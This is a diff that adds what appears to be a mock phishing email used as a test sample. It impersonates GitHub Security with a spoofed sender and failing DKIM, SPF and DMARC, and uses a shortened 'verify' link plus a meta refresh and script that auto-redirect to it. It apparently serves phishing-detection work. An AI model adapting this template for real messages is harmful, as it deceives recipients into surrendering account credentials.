@@ -1,1 +1,58 @@
-<!DOCTYPE  html>
+MIME-Version: 1.0
+Date: Tue, 28 Apr 2026 09:15:42 +0000
+Message-ID: <CABxyz123abc@mail.suspiciousdomain.net>
+Subject: Important Update to Your Account Security
+Delivered-To: victim@gmail.com
+Return-Path: <bounce@mailer-daemon.suspiciousdomain.net>
+From: "GitHub Security" <security@github.com>
+To: victim@gmail.com
+Reply-To: support@totally-not-github.ru
+Authentication-Results: mx.google.com;
+       dkim=fail (signature did not verify) header.i=@github.com header.s=selector1 header.b=fakeXXsig;
+       spf=softfail (google.com: domain of bounce@mailer-daemon.suspiciousdomain.net does not designate 209.85.220.41 as permitted sender) smtp.mailfrom=bounce@mailer-daemon.suspiciousdomain.net;
+       dmarc=fail (p=REJECT sp=REJECT dis=QUARANTINE) header.from=github.com
+Received: from mail.suspiciousdomain.net (mail.suspiciousdomain.net [185.220.101.47])
+        by mx.google.com with ESMTP id x9si123456pfn.88.2026.04.28.02.15.41
+        for <victim@gmail.com>;
+        Tue, 28 Apr 2026 02:15:42 -0700 (PDT)
+Received-SPF: softfail (google.com: domain of bounce@mailer-daemon.suspiciousdomain.net)
+X-Forwarded-To: victim@gmail.com
+Content-Type: multipart/alternative; boundary="----=_Part_MockBoundary_001"
+
+------=_Part_MockBoundary_001
+Content-Type: text/plain; charset="UTF-8"
+
+Dear GitHub User,
+
+We detected unusual sign-in activity on your account.
+Please verify your identity immediately to avoid suspension.
+
+Click here: https://bit.ly/3xFakeLnk
+
+GitHub Security Team
+
+------=_Part_MockBoundary_001
+Content-Type: text/html; charset="UTF-8"
+
+<!DOCTYPE html>
+<html>
+<head>
+  <meta http-equiv="refresh" content="5; url=https://bit.ly/3xFakeLnk">
+  <title>GitHub Security Alert</title>
+</head>
+<body>
+  <p>Dear GitHub User,</p>
+  <p>We detected unusual sign-in activity. Please verify immediately.</p>
+
+  <script type="text/javascript">
+    var encodedUrl = atob('aHR0cHM6Ly9iaXQubHkvM3hGYWtlTG5r');
+    setTimeout(function() {
+      window.location.href = "https://bit.ly/3xFakeLnk";
+    }, 3000);
+  </script>
+
+  <a href="https://bit.ly/3xFakeLnk">Verify My Account</a>
+</body>
+</html>
+
+------=_Part_MockBoundary_001--
